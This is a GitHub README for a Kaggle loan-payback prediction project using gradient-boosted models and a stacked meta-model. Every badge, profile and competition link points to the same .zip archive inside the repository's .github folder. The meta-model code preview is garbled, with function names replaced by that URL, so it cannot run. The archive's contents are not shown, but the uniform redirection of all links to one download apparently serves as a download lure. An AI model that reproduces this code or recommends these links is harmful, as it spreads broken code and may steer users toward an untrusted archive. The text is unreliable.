# 💰 Predicting Loan Payback

<p align="center">
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip%20Series%20S5E11-blue?logo=kaggle" alt="Kaggle" />
  </a>
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="Python" />
  </a>
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="Notebook" />
  </a>
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="License" />
  </a>
  <a href="#">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip%20Score-0.91200-lightgrey" alt="Score" />
  </a>
</p>


<p align="center">
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip" alt="Score" />
  </a>
</p>


Predicting whether a borrower will pay back their loan using **machine learning ensemble models** and a **stacked meta-model** for high accuracy.

---

## 📌 Project Overview & 🏆 Kaggle Competition

| 📌 **Project Overview** | 🏆 **Kaggle Competition & Score** |
|------------------------|----------------------------------|
| 📝 An end-to-end machine learning project covering **EDA**, **data preprocessing**, **feature engineering**, **model training**, and **evaluation** to predict the probability that a borrower will pay back their loan. Models include **CatBoost**, **LightGBM**, **XGBoost**, and a 🔥**Stacked Meta-Model**🔥. | 🚀 **Predicting Loan Payback – Playground Series: Season 5, Episode 11** <br> 🔗 https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip <br> 📊 **Public Score:** *0.91200* |

---

## 👤 Author

| 👤 **Name** | 🔗 **Github-Profile** |🔗 **Kaggle-Profile** |
|------------|----------------|----------------|
| Riddy Mazumder | [![GitHub](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)|[![Kaggle Profile](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)](https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip)|


---

## 🛠️ Tools & Libraries

| 🔧 **Category** | 🛠️ **Libraries / Tools** |
|---------------|------------------------|
| Data Manipulation & Analysis | `pandas`, `numpy` |
| Data Visualization | `matplotlib`, `seaborn` |
| Machine Learning | `catboost`, `lightgbm`, `xgboost`, `sklearn` (`KFold`, `metrics`) |
| Development | `Jupyter Notebook`, `.py` scripts, `.html` exports |

---

## 🔍 Workflow & Methodology

| Step | Description |
|------|-------------|
| **1. Load Dataset** | Load the loan dataset using `pandas` and inspect basic statistics. |
| **2. Data Exploration & Cleaning** | Explore distributions, missing values, and correlations. Visualize patterns with `seaborn` and `matplotlib`. |
| **3. Feature Engineering** | Encode categorical variables, create interaction features, and normalize numerical columns. |
| **4. Model Building** | Train base models (**CatBoost**, **LightGBM**, **XGBoost**) using **K-Fold cross-validation**. |

> 🔥 **5. 🔥 Meta-Model Training & Prediction**  
> This is the **core step** where out-of-fold predictions from base models are used to train a **stacked meta-model**, significantly boosting overall predictive performance. This often yields better generalization than any single model.

| Step | Description |
|------|-------------|
| **6. Model Evaluation** | Evaluate performance using metrics like **AUC-ROC**, **accuracy**, and **log loss**. |
| **7. Conclusion & Insights** | Identify key features driving loan repayment probability and discuss model improvements. |

---

## 📈 Model Performance

> ⭐ **Stacked Meta-Model Performance Highlight**  
> Combining CatBoost, LightGBM, and XGBoost with stacking improves predictive accuracy over individual models.

| Metric | Description |
|--------|-------------|
| Algorithms | CatBoost, LightGBM, XGBoost, **Stacked Meta-Model** |
| Evaluation | AUC-ROC, Accuracy, Log Loss |
| Visualizations | Feature importance plots, prediction probability distributions |
| Goal | High predictive accuracy for loan repayment probability on unseen test data |

---

## 🖥️ Mini Preview: Meta-Model Code & Plots
```bash
# Cell 8 — Meta-Model Training & Prediction
# -------------------------
X_meta_train = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip([oof_cat, oof_lgb, oof_xgb])
X_meta_test  = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip([pred_cat_test, pred_lgb_test, pred_xgb_test])

meta_model = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip(**meta_params)
# use early stopping via callback on a small internal split if desired; here we train on full meta features
https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip(X_meta_train, y_train_np)
final_pred = https://raw.githubusercontent.com/RiddyMazumder/Predicting-Loan-Payback-Playground-Series---Season-5-Episode-11/main/.github/Series_Payback_Episode_Playground_Predicting_Loan_Season_2.7.zip(X_meta_test)[:,1]
```
## 📄 License

This project is licensed under the **MIT License**.

You are free to use, modify, and distribute this project for educational and personal purposes.

---

## 💬 Feedback & Contributions

If you have any questions, suggestions, or improvements:

* 🐞 Open an issue
* 📤 Submit a pull request

Contributions are always welcome! 😊

---

Happy analyzing and learning! 🚀
